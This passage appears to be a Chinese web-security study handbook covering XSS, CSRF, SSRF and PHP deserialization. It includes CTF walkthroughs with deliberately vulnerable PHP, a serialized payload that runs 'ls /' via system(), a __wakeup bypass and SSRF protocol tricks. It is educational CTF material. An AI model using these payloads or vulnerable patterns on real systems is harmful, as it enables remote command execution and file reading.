focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <h4 id="存储型xss会出现的地方"><a href="#存储型xss会出现的地方" class="header-anchor">#</a> 存储型XSS会出现的地方：</h4> <ul><li><strong>任何可能插入数据库的地方</strong></li> <li><strong>用户注册的时候</strong></li> <li><strong>留言板</strong></li> <li><strong>上传文件的文件名</strong></li> <li><strong>（管理员可见的）报错信息</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>一般情况下来说前台的防御是高于后台的
</code></pre></div><h4 id="存储型xss"><a href="#存储型xss" class="header-anchor">#</a> 存储型xss：</h4> <ol><li><strong>同源法则</strong></li> <li><strong>XSS平台</strong></li> <li><strong>存储型XSS并不是非得存数据库</strong></li> <li><strong>XSS可以见框就插</strong></li></ol> <h2 id="dom-based-xss"><a href="#dom-based-xss" class="header-anchor">#</a> <a href="https://joker123op.github.io/blog2/handbook/xss.html#dom-based-xss" target="_blank" rel="noopener noreferrer">#<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>Dom Based XSS</h2> <ul><li><strong>Dom是一个Js可以操控浏览器和网页的接口</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>Dom不会经过服务器，本质上是自己打自己，因为每次有用户访问网站都会需要服务器对他分配一定资源，如果是有100万人同时访问，甚至更多。就会导致服务器压力过大。

所以这个时候就需要经过用户自己的本地，可以一定程度上给服务器减轻一部分压力，所以产生了漏洞

每个载入浏览器的HTML文档都会成为Document对象。

Document对象使我们可以从脚本中对HTML页面中的所有元素进行访问。
</code></pre></div><p><strong>Document的对象属性</strong></p> <table><thead><tr><th>属性</th> <th>描述</th></tr></thead> <tbody><tr><td>body</td> <td>提供对<code>&lt;body&gt;</code>元素的直接访问。对于定义了框架集的文档，该属性引用最外层的<code>&lt;frameset&gt;</code></td></tr> <tr><td>cookie</td> <td>设置或返回与当前文档有关的所有cookie</td></tr> <tr><td>domain</td> <td>返回当前文档的域名</td></tr> <tr><td>lastModified</td> <td>返回文档被修改的最后日期和时间。</td></tr> <tr><td>referrer</td> <td>返回载入当前文档的文档url。</td></tr> <tr><td>title</td> <td>返回当前文档的标题。</td></tr> <tr><td>URL</td> <td>返回当前文档的URL，</td></tr></tbody></table> <p><strong>这是上述函数的使用方法</strong></p> <table><thead><tr><th>函数</th> <th>作用</th></tr></thead> <tbody><tr><td>document.body</td> <td>提取Body信息</td></tr> <tr><td>document.domain</td> <td>提取当前页面域名</td></tr> <tr><td>document.lastModified</td> <td>查看当前页面的最后修改时间（同时也可以查看网站是否是静态网站）</td></tr></tbody></table> <p><strong>详细内容可以看看这篇扩展文章<a href="https://blog.csdn.net/weixin_45634365/article/details/114536958" target="_blank" rel="noopener noreferrer">Dom Based XSS(opens new window)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <p><strong>在真是网络环境中，还会存在一些伪静态网页，他们本质上还是动态。一样可以进行SQL注入。判断方法是使用函数<code>document.lastModified</code>来查看</strong></p> <p><strong>要依靠当前页面JS才能触发的漏洞，可以理解为dom型xss</strong></p> <h2 id="csrf-客户端跨站请求伪造"><a href="#csrf-客户端跨站请求伪造" class="header-anchor">#</a> CSRF(客户端跨站请求伪造)</h2> <ul><li><p><strong>CSRF跨站请求伪造：也被称为“One Click Attack”或者Seccion Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(xss)，但是他和xss非常不同，xss利用站点内的信任用户，而CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比xss更具危险性</strong></p></li> <li><p><strong>CSRF漏洞的成因是因为网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想做的功能(比如是添加账号等)</strong></p></li></ul> <p><strong>CSRF和XSS没有直接关系</strong></p> <div class="language- extra-class"><pre class="language-text"><code>XSS：在目标网页上执行JS来窃取Cookie

CSRF：危害很大，但是条件需要配合
</code></pre></div><ul><li><strong>1、恰好登陆</strong></li> <li><strong>2、好登陆了</strong></li></ul> <p><strong>生成一个CSRF攻击的html文件很简单，先在自己需要强制发送的数据包进行自己修改一下，再使用burpsutie进行抓包，然后右键</strong></p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304201602036.webp" alt="Img"></p> <p><strong>然后就会会生成一个html，把他保存下来就可以形成一个可以攻击的恶意CSRF</strong></p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304201603487.webp" alt="Img"></p> <h2 id="ssrf-服务端请求伪造"><a href="#ssrf-服务端请求伪造" class="header-anchor">#</a> SSRF （服务端请求伪造）</h2> <ul><li><p><strong>（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)</strong></p></li> <li><p><strong>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标</strong></p></li> <li><p>**SSRF可以使用A网站进行对B网站的攻击 **   <strong><code>公网和内网</code></strong></p></li></ul> <h4 id="安全意识现状"><a href="#安全意识现状" class="header-anchor">#</a> <strong>安全意识现状：</strong></h4> <ul><li><strong>外紧内松</strong></li> <li><strong>做安全是花钱的</strong></li></ul> <p><strong>一般情况下对内网都是处于一个比较信任的状态，很少会做一些防护，甚至有的是弱密码</strong></p> <p><strong>其核心就是利用外网来进行内网渗透而不是防止溯源</strong></p> <div class="language- extra-class"><pre class="language-text"><code>SSRF控制目标服务器发起网络请求

CSRF控制用户的浏览器发起网络请求
</code></pre></div><p><strong>访问网站协议有很多：</strong></p> <div class="language-text extra-class"><pre class="language-text"><code>http://

file:///        直接读取文件

dict://url:端口号         探测端口
</code></pre></div><p><strong>SSRF =&gt;</strong></p> <ul><li><strong>可以作为跳板</strong></li> <li><strong>可以攻击内网的网站</strong></li> <li><strong>可以攻击内网的服务（其实可以拿内网的服务器）</strong></li></ul> <p><strong>传参后面出现某些东西是很危险的</strong></p> <ul><li><p><strong>协议：http:// 任意其他协议都可以试试SSRF</strong></p></li> <li><p><strong>出现文件名：a.txt =&gt; b.php(x.后缀)</strong></p></li></ul> <h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="header-anchor">#</a> 反序列化漏洞</h2> <ul><li><strong>在我们程序之间进行数据传输的时候，想把这个变量传给另外一个系统</strong></li> <li><strong>序列化和反序列化 就是如果在两个程序进行一个交互，把这个变量传到另一个程序去。</strong></li> <li><strong>序列化就是将一个变量序列化完将它传到另一个程序，让这个程序再对它进行一个反序列化，就得到原来的</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231026110934046.webp" alt="image-20231026110934046"></p> <h4 id="序列化就是将一个对象转换成字符串。字符串包括-属性名-属性值-属性类型和该对象对应的类名。反序列化则相反将字符串重新恢复成对象-。"><a href="#序列化就是将一个对象转换成字符串。字符串包括-属性名-属性值-属性类型和该对象对应的类名。反序列化则相反将字符串重新恢复成对象-。" class="header-anchor">#</a> <strong>序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名</strong>。反序列化则相反将字符串重新恢复成对象**。**</h4> <table><thead><tr><th style="text-align:center;">类型</th> <th style="text-align:center;">过程</th></tr></thead> <tbody><tr><td style="text-align:center;">序列化</td> <td style="text-align:center;">对象   --&gt;   字符串</td></tr> <tr><td style="text-align:center;">反序列化</td> <td style="text-align:center;">字符串 ---&gt;  对象</td></tr></tbody></table> <h4 id="访问控制修饰符"><a href="#访问控制修饰符" class="header-anchor">#</a> 访问控制修饰符</h4> <div class="language- extra-class"><pre class="language-text"><code>public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名
</code></pre></div><p><strong>protected属性被序列化的时候属性值会变成 <code>%00\*%00属性名</code></strong> <strong>private属性被序列化的时候属性值会变成 <code>%00类名%00属性名</code></strong></p> <p><strong>%00为空白符，空字符也有长度，一个空字符长度为 1</strong></p> <h4 id="序列的含义"><a href="#序列的含义" class="header-anchor">#</a> 序列的含义</h4> <p><strong>例如：<code>O:4:&quot;user&quot;:2:{s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:3:&quot;LEO&quot;;}</code> <code>O</code>代表对象：</strong></p> <p><strong>序列化的操作：</strong></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>
 <span class="token comment">// echo serialize($id);</span>

<span class="token comment">// 加上对象的时候</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">stu</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'123'</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
   
<span class="token comment">//反序列化的时候用这个</span>
   <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'ok'</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><h4 id="魔术方法"><a href="#魔术方法" class="header-anchor">#</a> 魔术方法</h4> <ul><li><strong>魔术方法是语言中保留的方法名，各个方法会在对应操作时自动调用，以PHP语言中的魔术方法来做讲解</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231030163542868.webp" alt="image-20231030163542868"></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">stu</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'ipconfig'</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function-definition function">_construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;construct&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    
        <span class="token keyword">function</span> <span class="token function-definition function">_destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span>
    
    <span class="token punctuation">}</span>
    
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p><strong>以下是一个题目<a href="http://node5.anna.nssctf.cn:28458/" target="_blank" rel="noopener noreferrer">SWPUCTF 2022 新生赛  1z_unserialize<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <p><strong>题目给出了php代码</strong></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'NSSCTF.com'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lt</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lly</span><span class="token punctuation">;</span>
     
     <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lt</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lly</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nss'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token delimiter important">?&gt;</span></span> 
</code></pre></div><ul><li><strong><code>__destruct</code></strong> <strong>在php魔术方法中的析构函数 ，它的意思是 摧毁，毁坏。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</strong></li> <li>**<code>unserialize($_POST[‘nss’]);</code><strong><strong><strong>在执行完成后，通过 unserialize 重新创建的对象没有被任何变量引用，因此它将会被标记为不再需要，并最终会被 PHP 垃圾回收机制销毁。在对象被销毁的时候，__destruct 方法会被自动调用</strong></strong></strong>。</li></ul> <h4 id="题目代码给了php中特有的动态函数"><a href="#题目代码给了php中特有的动态函数" class="header-anchor">#</a> <strong>题目代码给了php中特有的动态函数</strong></h4> <div class="language- extra-class"><pre class="language-text"><code>// 这一行代码将 $this-&gt;lt 属性的值赋给变量 $a。因此，变量 $a 现在包含了一个可调用的函数或方法的引用。
$a = $this-&gt;lt;


// 在这一行代码中，变量 $a 被当作一个函数或方法来调用，同时传递 $this-&gt;lly 作为参数。这意味着 $this-&gt;lt 的值应该是一个函数或方法，而 $this-&gt;lly 被传递给这个函数或方法作为参数。 

$a($this-&gt;lly);

① 就相当于    $this-&gt;lt($this-&gt;lly);//很像命令执行 函数+指令
</code></pre></div><p><strong>所以我们可以通过构造一个恶意的序列化对象，将自定义的函数传递给 <code>$lt</code>属性，然后将要执行的代码（或者指向一个恶意代码文件的路径）传递给 <code>$lly</code> 属性。当对象被序列化后再被反序列化时，<code>__destruct</code>方法会被自动调用，从而执行指定的恶意操作。</strong></p> <h4 id="源码"><a href="#源码" class="header-anchor">#</a> 源码：</h4> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">lyh</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'NSSCTF.com'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lt</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lly</span><span class="token operator">=</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>
     
     <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
     <span class="token punctuation">{</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lt</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lly</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">lyh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p><strong>返回一串被反序列化后的值</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231101162629877.webp" alt="image-20231101162629877"> <strong>又题目给出 ，通过<code>POST</code>传参</strong></p> <p><strong>再用<code>ls</code> 查看根目录 ，一般的flag都在根目录下。通过命令我们查到了flag</strong></p> <p><strong><code>nss=O:3:&quot;lyh&quot;:3:{s:3:&quot;url&quot;;s:10:&quot;NSSCTF.com&quot;;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:4:&quot;ls /&quot;;}</code></strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231101164011093.webp" alt="image-20231101164011093"></p> <p><strong>接下来我们再用 <code>cat</code> 来打开这个flag   得到我们想要的</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231101165224169.webp" alt="image-20231101165224169"></p> <h4 id="再来一题"><a href="#再来一题" class="header-anchor">#</a> 再来一题</h4> <p><strong>题目：</strong></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">X</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">!==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>				<span class="token comment">//  这个函数就是一个高亮函数，通俗就是让这代码显示到次页面来</span>
        <span class="token comment">//flag is in fllllllag.php				// 这里告诉我们flag在这个php文件中</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></code></pre></div><p><strong>题目的意思就是说我们要把<code>fllllllag.php</code> 放到  这里<code>($this-&gt;x);</code> 也就是说让这个``X<code>等于它 。但是这里有个坑就是</code> __wakeup()<code>这个魔术方法就是当我们执行反序列化操作的时候，不管给什么值就是X 永远等于file</code>$this-&gt;x = <strong>FILE</strong>;`</strong></p> <p><strong>这里解释一下<code>__wakeup()</code> 这个函数。如果对象的魔法函数中存在的<code>__wakeup方法</code>，那么之后再调用 <code>unserilize() 方法</code>进行反序列化之前则会先调用<code>__wakeup方法</code>，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过``__wakeup`的执行。</strong></p> <h4 id="以下写一个php反序列化"><a href="#以下写一个php反序列化" class="header-anchor">#</a> 以下写一个php反序列化</h4> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">X</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fllllllag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div><p><strong>执行一下这个文件，得到一串被反序列化后的值 <code>O:1:&quot;X&quot;:1:{s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;}</code></strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102091626465.webp" alt="image-20231102091626465"></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token number">0</span> ：表示对象
<span class="token number">1</span> ：表示对象名称的长度
<span class="token constant">X</span> ：表示对象的名称
<span class="token number">1</span> ：表示对象里的属性的个数
s <span class="token punctuation">:</span>属性名类型
<span class="token number">1</span> <span class="token punctuation">:</span>属性名长度
x <span class="token punctuation">:</span>属性的名称
s <span class="token punctuation">:</span>属性值的类型
<span class="token number">13</span> <span class="token punctuation">:</span>属性值的长度
</code></pre></div><p><strong>得到flag ，这里的 <code>_wakeup函数</code>就强制对 <code>X</code>属性进行更改，要得到flag就必须绕过 ``_wakeup函数<code>，一般做ctf绕过的时候我们都会先序列化字符串，然后使序列化后字符串中属性的个数大于真实对象中属性的个数，即可绕过。然后将序列化后字符串中属性的个数由1改为3，大于真实属性个数1，即可绕过</code>__wakeup`</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102092001275.webp" alt="image-20231102092001275"></p> <h4 id="再来一题-2"><a href="#再来一题-2" class="header-anchor">#</a> 再来一题</h4> <p><strong>题目：<a href="https://www.ctfer.vip/problem/426" target="_blank" rel="noopener noreferrer">SWPUCTF 2021 新生赛ez_unserialize <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong> <strong>看到这种题目没什么小提示 那就直接看源代码</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102094534133.webp" alt="image-20231102094534133"></p> <p><strong>在源代码页面发现好东西  <code>disallow</code>也就是<code>Robots 协议</code>（也称为爬虫协议、爬虫规则、机器人协议等）的全称是 “网络爬虫排除标准”（Robots Exclusion Protocol），是指网站可建立一个<code>robots.txt文件</code>来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取<code>robots.txt文件</code>来识别这个页面是否允许被抓取。 但是,这个<code>robots协议</code>不是防火墙,也没有强制执行力,搜索引擎完全可以忽视<code>robots.txt文件</code>去抓取网页的快照。</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102094738954.webp" alt="image-20231102094738954"></p> <p><strong>从``robots.txt`文件中得知存在/cl45s.php，遂进入该目录下打开该文件</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102095417463.webp" alt="image-20231102095417463"></p> <p><strong>获得代码，接下来就是 php代码审计</strong></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231102102951288.webp" alt="image-20231102102951288"></p> <p><strong>相关解释</strong></p> <div class="language-php extra-class"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      					<span class="token comment">#通过error_reporting屏蔽报错</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;cl45s.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 					<span class="token comment">#将c145s.php的代码显示到页面上</span>
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">wllm</span><span class="token punctuation">{</span>               					<span class="token comment">#定义了一个wllm类</span>
 
    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>      				 	<span class="token comment">#公共变量admin</span>
    <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>       					<span class="token comment">#公共变量passwd</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>		 	 <span class="token comment">#construct当类创建时调用</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span><span class="token string double-quoted-string">&quot;user&quot;</span><span class="token punctuation">;</span>    			 <span class="token comment">#指定admin的值为user</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;123456&quot;</span><span class="token punctuation">;</span>			 <span class="token comment">#指定passwd的值为123456</span>
    <span class="token punctuation">}</span>
 
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 		<span class="token comment">#destruct当对象要销毁时调用</span>
        
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;admin&quot;</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;ctf&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
 <span class="token comment">#if判断 admin的值是不是admin passwd的值是不是ctf</span>
